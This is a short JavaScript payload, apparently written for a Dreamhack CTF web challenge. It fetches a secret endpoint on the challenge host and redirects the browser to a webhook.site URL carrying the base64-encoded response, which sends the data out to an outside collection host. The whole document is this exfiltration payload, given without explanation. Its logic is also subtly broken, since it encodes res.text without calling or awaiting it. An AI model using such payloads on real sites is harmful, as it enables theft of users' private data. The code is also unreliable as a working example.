let url='http://host3.dreamhack.games:10352/secret/1'
fetch(url, {
            method: "GET",
        })
            .then( (res) => { 
                          let a = btoa(res.text);
                          location.href='https://webhook.site/ab7fa65c-51ba-447e-b7e3-8a92e22c3571?'+a;
                        }
                  )
                  
